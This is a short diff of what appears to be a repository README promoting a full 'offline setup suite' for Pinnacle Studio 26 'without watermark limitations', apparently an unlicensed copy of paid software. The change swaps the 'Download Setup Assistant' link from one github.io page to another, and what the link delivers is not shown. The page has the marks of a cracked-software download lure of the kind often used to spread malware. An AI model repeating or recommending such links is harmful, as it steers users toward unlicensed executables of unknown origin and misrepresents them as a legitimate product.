@@ -3,7 +3,7 @@
 Unlock the full creative potential of Pinnacle Studio 26 with this complete offline setup suite. Designed for advanced video creators, this toolset allows full use of multi-cam editing, color grading, pro transitions, and export features — without watermark limitations.
 
 🔘 **Download Setup Assistant**  
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://pinnacle-studio-full-guide.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://pinnacle-info.github.io/.github/)
 
 ---
 
